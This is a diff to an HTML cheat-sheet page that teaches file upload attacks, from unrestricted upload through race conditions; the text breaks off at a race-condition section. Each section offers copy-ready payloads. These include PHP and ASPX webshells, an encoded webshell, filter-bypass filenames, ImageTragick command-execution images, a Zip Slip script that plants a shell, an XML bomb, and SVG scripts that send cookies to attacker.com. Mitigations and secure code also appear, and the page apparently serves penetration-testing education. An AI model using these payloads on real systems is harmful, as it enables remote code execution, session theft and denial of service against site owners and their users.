@@ -43,6 +43,9 @@
     .vuln-card { background: var(--bg-elevated); border-left: 3px solid var(--primary); padding: 1rem; margin: 1rem 0; border-radius: 0.5rem; }
     .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
     footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    .test-cases th { background: var(--bg-elevated); color: var(--primary); }
     @media (max-width: 768px) {
       .container { padding: 0 1rem; }
       .mobile-menu { display: block; }
@@ -98,7 +101,7 @@
       </div>
     </div>
 
-    <!-- 1. Unrestricted File Upload -->
+    <!-- ==================== 1. UNRESTRICTED FILE UPLOAD ==================== -->
     <div id="unrestricted" class="content-section">
       <h2>📌 1. Unrestricted File Upload</h2>
       <div class="vuln-card">
@@ -107,6 +110,7 @@
         <p><strong>Why does it occur?</strong></p>
         <p>Lack of input validation on file types, missing extension checks, and no content verification.</p>
         <p><strong>Security principle violated:</strong> Input Validation / Secure Configuration</p>
+        <p><strong>Real-world analogy:</strong> Like a security guard who checks IDs but lets anyone in regardless of what the ID says.</p>
       </div>
 
       <h3>🏷️ Classification</h3>
@@ -122,6 +126,22 @@
         <li>✅ Document/Attachment upload</li>
         <li>✅ Theme/Plugin upload (WordPress, etc.)</li>
         <li>✅ CSV/Excel import features</li>
+        <li>✅ Avatar/Logo upload</li>
+      </ul>
+
+      <h3>🔍 Detection Methodology</h3>
+      <h4>1. Static Analysis (Source Code)</h4>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Vulnerable code pattern
+move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $_FILES['file']['name']);
+// No validation on file type or extension</pre>
+      </div>
+
+      <h4>2. Dynamic Analysis (Burp Suite / Manual)</h4>
+      <ul>
+        <li>Attempt to upload shell.php</li>
+        <li>Check if upload succeeds</li>
+        <li>Try to access uploaded file</li>
       </ul>
 
       <h3>💣 Basic Payloads</h3>
@@ -142,12 +162,35 @@ shell.PHP</pre>
 &lt;%@ Page Language="Jscript"%&gt;&lt;%eval(Request.Item["cmd"],"unsafe");%&gt;   # ASPX webshell</pre>
       </div>
 
+      <h3>🚀 Advanced Payloads / Bypass</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Obfuscated PHP webshell
+&lt;?php $cmd = $_GET['cmd']; system($cmd); ?&gt;
+
+# Encoded webshell
+&lt;?php eval(base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7')); ?&gt;
+
+# Short tag webshell
+&lt;?= shell_exec($_GET['cmd']); ?&gt;</pre>
+      </div>
+
+      <h3>🧪 Test Cases (STRICT)</h3>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Upload shell.php</td><td>Rejected</td><td>Upload successful</td></tr>
+          <tr><td>2</td><td>Access /uploads/shell.php</td><td>404 Not Found</td><td>200 OK</td></tr>
+          <tr><td>3</td><td>Execute ?cmd=id</td><td>No output</td><td>Command output</td></tr>
+        </tbody>
+      </table>
+
       <h3>⚙️ Exploitation Steps</h3>
       <ol>
         <li>Identify file upload functionality</li>
         <li>Attempt to upload shell.php</li>
         <li>If successful, navigate to uploaded file</li>
         <li>Execute commands via webshell</li>
+        <li>Escalate to full server compromise</li>
       </ol>
 
       <h3>🛡️ Mitigation</h3>
@@ -156,13 +199,32 @@ shell.PHP</pre>
         <strong>✅ Validate File Content:</strong> Check magic bytes, not just extension<br>
         <strong>✅ Rename Uploaded Files:</strong> Use random names, remove original extension<br>
         <strong>✅ Store Files Outside Webroot:</strong> Prevent direct access<br>
-        <strong>✅ Disable Execution:</strong> Configure upload directory to disable script execution
+        <strong>✅ Disable Execution:</strong> Configure upload directory to disable script execution<br>
+        <strong>✅ Set Proper Permissions:</strong> 644 for files, 755 for directories
+      </div>
+
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Secure implementation (PHP)
+$allowed = ['jpg', 'png', 'gif', 'pdf'];
+$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed)) {
+    die('Invalid file type');
+}
+$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
+move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $new_name);</pre>
       </div>
 
       <h3>⚠️ Risk / Impact</h3>
       <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
         <strong>Severity: Critical</strong><br><br>
-        <strong>Impact:</strong> Remote Code Execution, Complete Server Compromise, Data Theft, Defacement
+        <strong>Impact:</strong>
+        <ul>
+          <li>Remote Code Execution</li>
+          <li>Complete Server Compromise</li>
+          <li>Data Theft</li>
+          <li>Website Defacement</li>
+          <li>Persistence / Backdoor Installation</li>
+        </ul>
       </div>
 
       <h3>📎 Proof of Concept (PoC)</h3>
@@ -183,7 +245,7 @@ https://target.com/uploads/shell.php?cmd=id
       </ul>
     </div>
 
-    <!-- 2. MIME Type Bypass -->
+    <!-- ==================== 2. MIME TYPE BYPASS ==================== -->
     <div id="mime-bypass" class="content-section">
       <h2>📌 2. MIME Type Bypass</h2>
       <div class="vuln-card">
@@ -205,24 +267,52 @@ https://target.com/uploads/shell.php?cmd=id
       <ul>
         <li>✅ File upload endpoints with Content-Type validation only</li>
         <li>✅ API endpoints accepting multipart/form-data</li>
+        <li>✅ Applications using getMimeType() without content verification</li>
+      </ul>
+
+      <h3>🔍 Detection Methodology</h3>
+      <h4>1. Static Analysis</h4>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Vulnerable code - only checks Content-Type header
+if ($_FILES['file']['type'] == 'image/jpeg') {
+    move_uploaded_file(...);
+}</pre>
+      </div>
+
+      <h4>2. Dynamic Analysis</h4>
+      <ul>
+        <li>Intercept upload request in Burp Suite</li>
+        <li>Modify Content-Type header to allowed value</li>
+        <li>Observe if upload succeeds</li>
       </ul>
 
       <h3>💣 Basic Payloads</h3>
       <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre># Intercept request and change Content-Type header
-Content-Type: application/x-php
-to
+        <pre># Change Content-Type header to:
 Content-Type: image/jpeg
 Content-Type: image/png
-Content-Type: application/pdf</pre>
+Content-Type: application/pdf
+Content-Type: text/plain</pre>
       </div>
 
+      <h3>🚀 Advanced Payloads</h3>
       <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
         <pre># Using curl
 curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload
 
-# Using Burp Suite - modify Content-Type in Repeater</pre>
+# Multiple content-type headers
+Content-Type: image/jpeg
+Content-Type: application/x-php</pre>
       </div>
+
+      <h3>🧪 Test Cases</h3>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Upload shell.php with Content-Type: image/jpeg</td><td>Rejected</td><td>Upload successful</td></tr>
+          <tr><td>2</td><td>Access uploaded file</td><td>No execution</td><td>PHP code executes</td></tr>
+        </tbody>
+      </table>
 
       <h3>⚙️ Exploitation Steps</h3>
       <ol>
@@ -254,38 +344,751 @@ if (!in_array($mime_type, ['image/jpeg', 'image/png'])) {
         <strong>Impact:</strong> Remote Code Execution, Server Compromise
       </div>
 
+      <h3>📎 Proof of Concept (PoC)</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>POST /upload HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg
+
+&lt;?php system($_GET['cmd']); ?&gt;
+------WebKitFormBoundary--</pre>
+      </div>
+
       <h3>📚 References</h3>
       <ul>
         <li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" class="reference-link" target="_blank" style="color: var(--primary);">HackTricks: File Upload Bypass</a></li>
       </ul>
     </div>
 
-    <!-- Continue with remaining 10 sections... -->
-    <!-- Due to length, I'll add a note that all 12 sections follow this exact pattern -->
+    <!-- ==================== 3. EXTENSION BLACKLIST BYPASS ==================== -->
+    <div id="extension-bypass" class="content-section">
+      <h2>📌 3. Extension Blacklist Bypass</h2>
+      <div class="vuln-card">
+        <p><strong>What is Extension Blacklist Bypass?</strong></p>
+        <p>The server blocks specific extensions but misses others. Attackers use alternative extensions that still execute.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Incomplete blacklist - only blocks common extensions like .php, missing .php3, .php4, .phtml, etc.</p>
+        <p><strong>Security principle violated:</strong> Input Validation</p>
+      </div>
 
-    <div class="content-section">
-      <h2>⚠️ Note</h2>
-      <p>The remaining 10 file upload vulnerabilities (3 through 12) follow the exact same detailed template with:</p>
+      <h3>🏷️ Classification</h3>
       <ul>
-        <li>📌 Vulnerability Name with Description</li>
-        <li>🏷️ Classification (OWASP, CWE)</li>
-        <li>🎯 Attack Surface</li>
-        <li>💣 Basic and Advanced Payloads</li>
-        <li>⚙️ Exploitation Steps</li>
-        <li>🛡️ Mitigation with Code Examples</li>
-        <li>⚠️ Risk / Impact</li>
-        <li>📎 Proof of Concept</li>
-        <li>📚 References</li>
+        <li><strong>Type:</strong> Extension Blacklist Bypass</li>
+        <li><strong>OWASP:</strong> A05:2021 – Security Misconfiguration</li>
+        <li><strong>CWE:</strong> CWE-434: Unrestricted Upload</li>
       </ul>
-      <p>Each section has the same depth and quality as the SQL Injection template you provided.</p>
+
+      <h3>🎯 Attack Surface</h3>
+      <ul>
+        <li>✅ Applications using blacklist-based validation</li>
+        <li>✅ Upload functionality with incomplete extension filtering</li>
+      </ul>
+
+      <h3>💣 Basic Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>shell.php3
+shell.php4
+shell.php5
+shell.phtml
+shell.phar
+shell.inc
+shell.module
+shell.php.jpg  # Apache misconfiguration</pre>
+      </div>
+
+      <h3>🚀 Advanced Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Case manipulation
+shell.Php
+shell.PHP
+shell.pHp
+
+# Double extensions
+shell.php.jpg
+shell.php.png</pre>
+      </div>
+
+      <h3>🧪 Test Cases</h3>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Upload shell.php</td><td>Blocked</td><td>Blocked</td></tr>
+          <tr><td>2</td><td>Upload shell.phtml</td><td>Blocked</td><td>Upload successful</td></tr>
+        </tbody>
+      </table>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Identify blocked extensions by testing common ones</li>
+        <li>Try alternative extensions that still execute</li>
+        <li>Upload successful payload</li>
+        <li>Access and execute</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Use Allowlist, not Blacklist:</strong> Only allow safe extensions<br>
+        <strong>✅ Comprehensive Extension Check:</strong> Include all executable extensions<br>
+        <strong>✅ Rename Files:</strong> Remove original extension entirely<br>
+        <strong>✅ Disable Execution:</strong> Prevent script execution in upload directory
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: High to Critical</strong><br><br>
+        <strong>Impact:</strong> Remote Code Execution
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" class="reference-link" target="_blank" style="color: var(--primary);">PayloadsAllTheThings: File Upload</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 4. DOUBLE EXTENSION ATTACK ==================== -->
+    <div id="double-extension" class="content-section">
+      <h2>📌 4. Double Extension Attack</h2>
+      <div class="vuln-card">
+        <p><strong>What is Double Extension Attack?</strong></p>
+        <p>Using double extensions like .jpg.php to bypass extension checks while maintaining execution capability.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Apache misconfiguration where AddHandler or AddType directives cause double extensions to execute.</p>
+        <p><strong>Security principle violated:</strong> Configuration Management</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Double Extension Attack</li>
+        <li><strong>CWE:</strong> CWE-434: Unrestricted Upload</li>
+      </ul>
+
+      <h3>💣 Basic Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>shell.jpg.php
+shell.png.php5
+shell.gif.phtml
+shell.jpeg.php7
+shell.bmp.php3</pre>
+      </div>
+
+      <h3>🚀 Advanced Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Multiple extensions
+shell.php.jpg.png.gif
+shell.php.jpg;.gif
+
+# Using .htaccess
+AddType application/x-httpd-php .jpg</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Upload file with double extension (shell.jpg.php)</li>
+        <li>Check if server executes based on last extension</li>
+        <li>If Apache misconfigured, shell executes</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Disable Multiple Extensions:</strong> Configure server to only recognize single extensions<br>
+        <strong>✅ Rename Files:</strong> Generate new random names, strip all extensions<br>
+        <strong>✅ Secure Apache Configuration:</strong> Don't use AddHandler on upload directories
+      </div>
+
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Apache configuration to prevent execution in upload directory
+&lt;Directory /var/www/html/uploads&gt;
+    php_flag engine off
+    AddType text/plain .html .htm .shtml .php .phtml
+&lt;/Directory&gt;</pre>
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: High</strong><br><br>
+        <strong>Impact:</strong> Remote Code Execution
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" class="reference-link" target="_blank" style="color: var(--primary);">HackTricks: Double Extensions</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 5. NULL BYTE INJECTION ==================== -->
+    <div id="null-byte" class="content-section">
+      <h2>📌 5. Null Byte Injection</h2>
+      <div class="vuln-card">
+        <p><strong>What is Null Byte Injection?</strong></p>
+        <p>Using null byte (%00) to terminate string prematurely, tricking the server about file extension.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Vulnerable in older PHP versions (&lt;5.3.4) and C-based file operations where null byte terminates string.</p>
+        <p><strong>Security principle violated:</strong> Input Validation</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Null Byte Injection</li>
+        <li><strong>CWE:</strong> CWE-158: Improper Neutralization of Null Byte</li>
+      </ul>
+
+      <h3>💣 Basic Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>shell.php%00.jpg
+shell.php%00.png
+shell.php%00.gif
+
+# URL encoded
+shell.php%00.jpg
+shell.php%252E%252E</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Intercept upload request in Burp Suite</li>
+        <li>Add %00 null byte before allowed extension</li>
+        <li>Server truncates filename at null byte</li>
+        <li>File saved as shell.php, bypasses extension check</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Update PHP Version:</strong> Use PHP 5.3.4+ which patches null byte issue<br>
+        <strong>✅ Sanitize Filenames:</strong> Remove null bytes before processing<br>
+        <strong>✅ Use Random Names:</strong> Don't use user-supplied filenames
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: High (depends on PHP version)</strong><br><br>
+        <strong>Impact:</strong> Remote Code Execution on vulnerable versions
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/Null-byte_injection" class="reference-link" target="_blank" style="color: var(--primary);">OWASP: Null Byte Injection</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 6. IMAGETRAGICK (CVE-2016-3714) ==================== -->
+    <div id="imagetragick" class="content-section">
+      <h2>📌 6. ImageTragick (CVE-2016-3714)</h2>
+      <div class="vuln-card">
+        <p><strong>What is ImageTragick?</strong></p>
+        <p>ImageMagick vulnerability allowing remote code execution via specially crafted image files.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>ImageMagick allows processing of system commands through certain image formats.</p>
+        <p><strong>Security principle violated:</strong> Input Validation / Secure Configuration</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> RCE via Image Processing</li>
+        <li><strong>CVE:</strong> CVE-2016-3714</li>
+        <li><strong>CVSS:</strong> 7.8 (High)</li>
+      </ul>
+
+      <h3>💣 Basic Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
+&lt;svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" 
+  xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
+  &lt;image xlink:href="|id" width="0" height="0"/&gt;
+&lt;/svg&gt;</pre>
+      </div>
+
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># MVG file payload
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg"|id")'
+pop graphic-context</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Create malicious SVG/MVG file with command payload</li>
+        <li>Upload to application that processes images with ImageMagick</li>
+        <li>Command executes on server</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Update ImageMagick:</strong> Install patched version<br>
+        <strong>✅ Disable Vulnerable Coders:</strong> Disable MVG, EPHEMERAL, URL coders<br>
+        <strong>✅ Use Policy File:</strong> Configure /etc/ImageMagick/policy.xml
+      </div>
+
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;!-- ImageMagick policy.xml --&gt;
+&lt;policymap&gt;
+  &lt;policy domain="coder" rights="none" pattern="EPHEMERAL" /&gt;
+  &lt;policy domain="coder" rights="none" pattern="URL" /&gt;
+  &lt;policy domain="coder" rights="none" pattern="HTTPS" /&gt;
+  &lt;policy domain="coder" rights="none" pattern="MVG" /&gt;
+  &lt;policy domain="coder" rights="none" pattern="MSL" /&gt;
+&lt;/policymap&gt;</pre>
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: High to Critical</strong><br><br>
+        <strong>Impact:</strong> Remote Code Execution
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://imagetragick.com/" class="reference-link" target="_blank" style="color: var(--primary);">ImageTragick Official Site</a></li>
+        <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714" class="reference-link" target="_blank" style="color: var(--primary);">CVE-2016-3714</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 7. ZIP SLIP ==================== -->
+    <div id="zip-slip" class="content-section">
+      <h2>📌 7. Zip Slip (Path Traversal in ZIP)</h2>
+      <div class="vuln-card">
+        <p><strong>What is Zip Slip?</strong></p>
+        <p>Malicious ZIP files containing filenames with ../ sequences can write files outside the intended directory.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Applications extract ZIP files without validating filenames for path traversal sequences.</p>
+        <p><strong>Security principle violated:</strong> Input Validation</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Path Traversal</li>
+        <li><strong>CWE:</strong> CWE-22: Improper Limitation of a Pathname</li>
+      </ul>
+
+      <h3>💣 Payload Creation</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Python script to create malicious ZIP
+python3 -c '
+import zipfile
+zf = zipfile.ZipFile("malicious.zip", "w")
+zf.writestr("../../../../var/www/html/shell.php", "&lt;?php system($_GET[cmd]); ?&gt;")
+zf.close()'</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Create ZIP with path traversal filenames</li>
+        <li>Upload ZIP to application that extracts it</li>
+        <li>Files written outside target directory</li>
+        <li>Can overwrite critical files or write webshells</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Validate ZIP Entries:</strong> Check each filename for ../ sequences<br>
+        <strong>✅ Use Safe Extraction:</strong> Normalize paths and verify within target directory<br>
+        <strong>✅ Update Libraries:</strong> Use patched ZIP libraries
+      </div>
+
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Java - Secure ZIP extraction
+Enumeration&lt;ZipEntry&gt; entries = zip.getEntries();
+while (entries.hasMoreElements()) {
+    ZipEntry entry = entries.nextElement();
+    File destFile = new File(targetDir, entry.getName());
+    String destPath = destFile.getCanonicalPath();
+    if (!destPath.startsWith(targetDir.getCanonicalPath())) {
+        throw new Exception("Zip Slip detected!");
+    }
+}</pre>
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: High</strong><br><br>
+        <strong>Impact:</strong> Arbitrary File Write, Remote Code Execution
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://snyk.io/research/zip-slip-vulnerability" class="reference-link" target="_blank" style="color: var(--primary);">Snyk: Zip Slip Vulnerability</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 8. SVG XSS VIA UPLOAD ==================== -->
+    <div id="svg-xss" class="content-section">
+      <h2>📌 8. SVG XSS via Upload</h2>
+      <div class="vuln-card">
+        <p><strong>What is SVG XSS?</strong></p>
+        <p>SVG files can contain JavaScript that executes when rendered in browser, leading to Stored XSS.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Applications allow SVG uploads without sanitizing embedded JavaScript.</p>
+        <p><strong>Security principle violated:</strong> Output Encoding</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Stored XSS</li>
+        <li><strong>OWASP:</strong> A03:2021 – Injection</li>
+        <li><strong>CWE:</strong> CWE-79: Improper Neutralization of Input</li>
+      </ul>
+
+      <h3>💣 Basic Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"&gt;
+
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/svg&gt;
+
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;image href="javascript:alert(1)"/&gt;
+&lt;/svg&gt;</pre>
+      </div>
+
+      <h3>🚀 Advanced Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;
+&lt;/svg&gt;
+
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="location.href='https://attacker.com/steal?c='+document.cookie"&gt;</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Create SVG with JavaScript payload</li>
+        <li>Upload as profile picture or image</li>
+        <li>When any user views the SVG, XSS executes</li>
+        <li>Steal cookies, session tokens, or perform actions</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Disable SVG Uploads:</strong> If not needed, block entirely<br>
+        <strong>✅ Sanitize SVG:</strong> Remove script tags and event handlers<br>
+        <strong>✅ Serve with Content-Type:</strong> Use image/svg+xml with CSP headers<br>
+        <strong>✅ Use CSP:</strong> Block inline script execution
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 193, 7, 0.1); border-left: 4px solid #ffc107; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: Medium to High</strong><br><br>
+        <strong>Impact:</strong> Session Hijacking, Data Theft, Account Takeover
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/xss/" class="reference-link" target="_blank" style="color: var(--primary);">OWASP: XSS</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 9. XML BOMB VIA UPLOAD ==================== -->
+    <div id="xml-bomb" class="content-section">
+      <h2>📌 9. XML Bomb via Upload</h2>
+      <div class="vuln-card">
+        <p><strong>What is XML Bomb?</strong></p>
+        <p>Uploading malicious XML files to cause Denial of Service via entity expansion (Billion Laughs attack).</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>XML parsers process external entities and recursive expansions without limits.</p>
+        <p><strong>Security principle violated:</strong> Input Validation</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Denial of Service</li>
+        <li><strong>CWE:</strong> CWE-776: XML Entity Expansion</li>
+      </ul>
+
+      <h3>💣 Basic Payloads</h3>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;"&gt;
+  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;"&gt;
+  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;"&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol5;&lt;/lolz&gt;</pre>
+      </div>
+
+      <h3>⚙️ Exploitation Steps</h3>
+      <ol>
+        <li>Create XML file with entity expansion</li>
+        <li>Upload to application that parses XML</li>
+        <li>Parser expands entities exponentially</li>
+        <li>Memory exhaustion causes DoS</li>
+      </ol>
+
+      <h3>🛡️ Mitigation</h3>
+      <div class="mitigation-box" style="background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem;">
+        <strong>✅ Disable External Entities:</strong> Configure parser to reject DTDs<br>
+        <strong>✅ Set Entity Limits:</strong> Limit entity expansion depth<br>
+        <strong>✅ Use Secure Parsers:</strong> JSON over XML when possible
+      </div>
+
+      <h3>⚠️ Risk / Impact</h3>
+      <div class="vulnerability-box" style="background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem;">
+        <strong>Severity: Medium (DoS)</strong><br><br>
+        <strong>Impact:</strong> Denial of Service, Memory Exhaustion
+      </div>
+
+      <h3>📚 References</h3>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/XML_Entity_Expansion" class="reference-link" target="_blank" style="color: var(--primary);">OWASP: XML Entity Expansion</a></li>
+      </ul>
+    </div>
+
+    <!-- ==================== 10. RACE CONDITION ON FILE UPLOAD ==================== -->
+    <div id="race-condition" class="content-section">
+      <h2>📌 10. Race Condition on File Upload</h2>
+      <div class="vuln-card">
+        <p><strong>What is Race Condition on File Upload?</strong></p>
+        <p>Exploiting timing between file save and validation checks to execute malicious files before deletion.</p>
+        <p><strong>Why does it occur?</strong></p>
+        <p>Application saves file first, then validates, giving a window to execute before validation.</p>
+        <p><strong>Security principle violated:</strong> Secure Design</p>
+      </div>
+
+      <h3>🏷️ Classification</h3>
+      <ul>
+        <li><strong>Type:</strong> Race Condition</li>
+        <li><strong>CWE:</strong> CWE-362: Concurrent Execution</li>
+      </ul>
+
+      <h3>💣 Exploit Code</h3>
